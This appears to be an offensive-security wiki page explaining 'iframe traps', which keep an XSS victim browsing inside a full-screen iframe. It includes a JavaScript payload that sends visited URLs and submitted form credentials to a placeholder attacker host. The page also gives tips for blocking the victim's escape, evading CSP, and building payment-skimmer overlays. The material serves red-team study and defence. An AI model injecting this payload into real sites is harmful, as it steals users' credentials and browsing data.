# Iframe Traps

{{#include ../banners/hacktricks-training.md}}

## Basic Information

This form of abusing XSS via iframes to steal information from the user moving across the web page was originally published in these 2 post from trustedsec.com: [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **and** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

The attack start in a page vulnerable to a XSS where it’s possible to make the **victims don’t leave the XSS** by making them **navigate within an iframe** that occupies all the web application.

The XSS attack will basically load the web page in an iframe in 100% of the screen. Therefore, the victim **won't notice he is inside an iframe**. Then, if the victim navigates in the page by clicking links inside the iframe (inside the web), he will be **navigating inside the iframe** with the arbitrary JS loaded stealing information from this navigation.

Moreover, to make it more realistic, it’s possible to use some **listeners** to check when an iframe changes the location of the page, and update the URL of the browser with that locations the user things he’s is moving pages using the browser.

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

Moreover, it's possible to use listeners to steal sensitive information, not only the other pages the victim is visiting, but also the data used to **filled forms** and send them (credentials?) or to **steal the local storage**...

Ofc, the main limitations are that a **victim closing the tab or putting another URL in the browser will escape the iframe**. Another way to do this would be to **refresh the page**, however, this could be partially **prevented** by disabling the right click context menu every time a new page is loaded inside the iframe or noticing when the mouse of the user leaves the iframe, potentially to click the reload button of the browser and in this case the URL of the browser is updated with the original URL vulnerable to XSS so if the user reloads it, it will get poisoned again (note that this is not very stealth).

## Modernised trap (2024+)

* Use a **full‑viewport iframe** plus History/Navigation API to mimic real navigation.

<details>
<summary>Full-viewport iframe trap</summary>

```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
  const w=i.contentWindow;
  ['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
  w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
  w.document.addEventListener('submit',ev=>{
    const fd=new FormData(ev.target);
    fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
  },true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) keeps the outer URL bar in sync without leaking the real URL.
* Go **fullscreen** to hide browser UI and draw your own fake address bar/padlock.

## Overlay & skimmer usage

* Compromised merchants replace hosted payment iframes (Stripe, Adyen, etc.) with a **pixel‑perfect overlay** that forwards keystrokes while the real frame stays underneath, sometimes using legacy validation APIs so the flow never breaks.
* Trapping users in the top frame captures **autofill/password‑manager** data before they notice the URL bar never changed.

## Evasion tricks observed in 2025 research

* `about:blank`/`data:` local frames inherit the parent origin and bypass some content‑blocker heuristics; nested iframes can respawn even when extensions tear down third‑party frames.
* **Permission propagation**: rewriting the parent `allow` attribute grants nested attacker frames fullscreen/camera/microphone without obvious DOM changes.

## Quick OPSEC tips

* Re‑focus the iframe when the mouse leaves (`mouseleave` on body) to stop users reaching the browser UI.
* Disable context menu and common shortcuts (`keydown` for `F11`, `Ctrl+L`, `Ctrl+T`) inside the frame to slow escape attempts.
* If CSP blocks inline scripts, inject a remote bootstrapper and enable `srcdoc` on the iframe so your payload lives outside the enforced CSP of the main page.

## Related

{{#ref}}
clickjacking.md
{{#endref}}



## References

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
